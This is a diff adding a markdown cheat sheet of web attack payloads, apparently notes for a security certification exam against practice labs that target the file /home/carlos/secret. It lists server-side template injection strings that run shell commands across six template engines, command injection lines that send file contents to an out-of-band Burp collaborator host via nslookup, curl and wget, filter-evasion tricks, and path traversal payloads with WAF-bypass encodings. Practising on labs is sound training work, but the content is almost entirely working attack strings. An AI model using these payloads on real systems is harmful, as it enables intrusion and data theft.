@@ -1,3 +1,222 @@
+# SSTI (Server-Side Template Injection) Payloads
+
+## Detection
+
+```
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+```
+
+## Jinja2 (Python)
+
+### Read File
+```python
+{{ ''.__class__.__mro__[1].__subclasses__()[396]('/home/carlos/secret').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/home/carlos/secret').read() }}
+```
+
+### RCE
+```python
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/carlos/secret').read() }}
+```
+
+## Freemarker (Java)
+
+```java
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ ex("cat /home/carlos/secret") }
+```
+
+## Velocity (Java)
+
+```java
+#set($x='')
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($chr=$x.class.forName('java.lang.Character'))
+#set($str=$x.class.forName('java.lang.String'))
+#set($ex=$rt.getRuntime().exec('cat /home/carlos/secret'))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end
+```
+
+## Twig (PHP)
+
+```php
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /home/carlos/secret")}}
+{{['cat /home/carlos/secret']|filter('system')}}
+```
+
+## ERB (Ruby)
+
+```ruby
+<%= system('cat /home/carlos/secret') %>
+<%= `cat /home/carlos/secret` %>
+```
+
+## Tornado (Python)
+
+```python
+{% import os %}
+{{ os.popen('cat /home/carlos/secret').read() }}
+```
+
+# OS Command Injection Payloads
+
+## DNS Exfiltration (RECOMMENDED)
+
+### Read File via DNS
+```bash
+||nslookup $(cat /home/carlos/secret).burp.oastify.com||
+||nslookup `cat /home/carlos/secret`.burp.oastify.com||
+```
+
+### Alternative Syntax
+```bash
+;nslookup $(cat /home/carlos/secret).burp.oastify.com;
+|nslookup $(cat /home/carlos/secret).burp.oastify.com|
+&nslookup $(cat /home/carlos/secret).burp.oastify.com&
+```
+
+## HTTP Exfiltration
+
+### Using curl
+```bash
+||curl burp.oastify.com?c=$(cat /home/carlos/secret)||
+||curl burp.oastify.com --data "$(cat /home/carlos/secret)"||
+```
+
+### Using wget
+```bash
+||wget --post-data=$(cat /home/carlos/secret) burp.oastify.com||
+```
+
+## Detection Payloads
+
+### Time-Based
+```bash
+||sleep 10||
+||ping -c 10 127.0.0.1||
+```
+
+### Out-of-Band
+```bash
+||nslookup burp.oastify.com||
+||curl burp.oastify.com||
+```
+
+## Command Separators
+
+```bash
+;    # Semicolon
+|    # Pipe
+||   # OR
+&    # Background
+&&   # AND
+%0a  # Newline
+%0d  # Carriage return
+`    # Backticks
+$()  # Command substitution
+```
+
+## Bypass Techniques
+
+### Space Bypass
+```bash
+cat${IFS}/home/carlos/secret
+cat%09/home/carlos/secret
+cat$IFS$9/home/carlos/secret
+```
+
+### Keyword Filtering
+```bash
+c''at /home/carlos/secret
+c\at /home/carlos/secret
+```
+
+## Quick Reference
+
+**Always use DNS exfiltration on exam!**
+```bash
+||nslookup $(cat /home/carlos/secret).burp.oastify.com||
+```
+
+# Path Traversal Payloads
+
+## Basic Payloads
+
+### Linux/Unix
+```
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+```
+
+### Target File
+```
+../../../home/carlos/secret
+../../../../home/carlos/secret
+../../../../../home/carlos/secret
+```
+
+## Absolute Path
+```
+/etc/passwd
+/home/carlos/secret
+```
+
+## Bypass Techniques
+
+### Non-Recursive Stripping
+```
+....//....//....//etc/passwd
+....//....//....//home/carlos/secret
+```
+
+### URL Encoding
+```
+..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2fhome%2fcarlos%2fsecret
+```
+
+### Double URL Encoding
+```
+..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252fhome%252fcarlos%252fsecret   (in case of waf blocking, encode chars too)
+```
+
+### Full Path Encoding (WAF Bypass)
+```
+%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
+```
+
+### Start Path Validation
+```
+/var/www/images/../../../etc/passwd
+/var/www/images/../../../home/carlos/secret
+```
+
+### Null Byte (Old Systems)
+```
+../../../etc/passwd%00.png
+../../../home/carlos/secret%00.png
+```
+
+### Windows Backslash
+```
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\home\carlos\secret
+```
+
+
 ## XSS Bypass Alternatives
 
 ### Scenario: Angle Brackets Blocked
